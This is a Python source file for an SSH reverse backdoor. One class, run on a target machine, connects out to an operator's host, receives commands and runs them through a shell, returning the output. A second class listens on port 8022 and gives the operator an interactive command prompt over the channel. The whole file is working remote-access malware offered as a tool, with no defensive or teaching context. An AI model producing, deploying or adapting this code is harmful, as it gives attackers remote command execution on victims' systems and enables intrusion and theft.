import logging
import os
import paramiko
import socket
import subprocess
import shlex
import threading


logging.getLogger("paramiko").setLevel(logging.WARNING)
logging.basicConfig(
    level=logging.DEBUG,
    format='[%(asctime)s] [%(levelname)s] - %(message)s'
)


class SSHReverseBackdoor:
    '''Reverse backdoor using SSH protocol'''

    def __init__(self, username: str, passwd: str, ip: str, port: int) -> None:
        # check if args are of valid type
        assert isinstance(ip, str)
        assert isinstance(port, int)
        assert isinstance(username, str)
        assert isinstance(passwd, str)

        # create client
        self._client = paramiko.SSHClient()
        self._client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # connect to the client
        self._client.connect(
            hostname=ip,
            port=port,
            username=username,
            password=passwd,
        )

    def __del__(self):
        self._client.close()

    def start(self):
        '''for custom backdoor'''
        # create ssh session
        session = self._client.get_transport().open_session()
        logging.info(f'Session Created')

        # receive first message
        if session.recv(1024).decode("utf-8") == '!!ok':
            logging.info('first message recvd')

        while session.active:
            try:
                cmd = session.recv(1024).decode('utf-8')

                # if cmd is exit then break the loop
                if cmd == '!!exit':
                    break

                # execute command and return output to handler
                else:
                    output = subprocess.check_output(
                        shlex.split(cmd), shell=True, stderr=subprocess.PIPE)
                    session.send(output or '!!ok')

            # send exception to handler 
            except Exception as e:
                session.send(f'Exception: {e}'.encode('utf-8'))
                logging.error(e)

        logging.info('Session Closed')


class SSHReverseBackackdoorHandler:
    class Handler(paramiko.ServerInterface):
        '''SSH backdoor handler'''

        def __init__(self, username: str, passwd: str) -> None:
            self._username = username
            self._passwd = passwd
            self.event = threading.Event()

        def check_channel_request(self, kind: str, chanid: int) -> int:
            if kind == 'session':
                return paramiko.OPEN_SUCCEEDED

            return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

        def check_auth_password(self, username: str, password: str) -> int:
            if (username == self._username) and (password == self._passwd):
                return paramiko.AUTH_SUCCESSFUL
            return paramiko.AUTH_FAILED

    def __init__(self, username: str, passwd: str, host: str = '0.0.0.0', port=8022, rsa_key_path: str = None) -> None:
        assert isinstance(username, str)
        assert isinstance(passwd, str)
        assert isinstance(host, str)
        assert isinstance(port, int)
        assert isinstance(rsa_key_path, str)
        assert os.path.exists(rsa_key_path)  # file doesn't exist

        self._username = username
        self._passwd = passwd
        self._host = host
        self._port = port
        self._rsa_key = paramiko.RSAKey(filename=rsa_key_path)

    def start(self):
        # try to bind socket address to the host
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((self._host, self._port))
            logging.info(f'[*] Listening on {self._host}:{self._port}')
            sock.listen(100)
            client, addr = sock.accept()
        except Exception as e:
            logging.error(f'Listen Failed: {e}')
            return
        else:
            logging.info(f'Got connection: {addr}')

        # create ssh
        session = paramiko.Transport(client)
        session.add_server_key(self._rsa_key)
        server = self.Handler(
            username=self._username,
            passwd=self._passwd,
        )
        session.start_server(server=server)

        channel = session.accept(20)
        if channel is None:
            return

        logging.info('Backdoor Authenticated')

        # send first message
        channel.send('!!ok')

        # ask and execute command
        bad_chars_list = ['', '\r', '\r\n']
        while channel.active:
            cmd = input(f'>> ').strip()

            # avoid executing error generating characters
            if cmd in bad_chars_list:
                continue

            # create exit command to exit the interactive mode
            if cmd == '!!exit':
                channel.send('!!exit')
                break

            # encode command and send to backdoor
            channel.send(cmd.encode('utf-8'))
            output = channel.recv(1024).decode()
            print(output)

        channel.close()
